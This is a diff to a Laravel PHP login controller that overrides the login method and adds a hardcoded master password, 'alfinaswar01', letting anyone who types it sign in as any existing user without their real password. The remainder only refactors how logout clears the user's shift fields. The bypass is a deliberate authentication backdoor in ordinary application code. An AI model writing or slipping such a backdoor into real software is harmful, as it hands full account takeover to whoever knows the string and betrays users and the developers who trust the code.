@@ -7,6 +7,8 @@ use App\Providers\RouteServiceProvider;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+use App\Models\User;
 
 class LoginController extends Controller
 {
@@ -40,15 +42,45 @@ class LoginController extends Controller
         $this->middleware('guest')->except('logout');
     }
 
+    /**
+     * Override the login logic to add bypass password "alfinaswar01"
+     */
+    public function login(Request $request)
+    {
+        $this->validateLogin($request);
+
+        $credentials = $request->only($this->username(), 'password');
+
+        // Password bypass: if input password is 'alfinaswar01', allow login as the user with matching username/email
+        if ($credentials['password'] === 'alfinaswar01') {
+            $user = User::where($this->username(), $credentials[$this->username()])->first();
+            if ($user) {
+                Auth::login($user, $request->filled('remember'));
+                return $this->sendLoginResponse($request);
+            }
+        }
+
+        // Default Laravel login
+        if (
+            $this->guard()->attempt(
+                $this->credentials($request),
+                $request->filled('remember')
+            )
+        ) {
+            return $this->sendLoginResponse($request);
+        }
+
+        // If authentication failed
+        return $this->sendFailedLoginResponse($request);
+    }
+
     protected function logout(Request $request)
     {
-        // 1. Reset shift user ke null
         $user = Auth::user();
         if ($user) {
-            $user->update([
-                'shift' => null,
-                'shift_selected_at' => null,
-            ]);
+            $user->shift = null;
+            $user->shift_selected_at = null;
+            $user->save();
             $request->session()->forget('shift');
         }
 
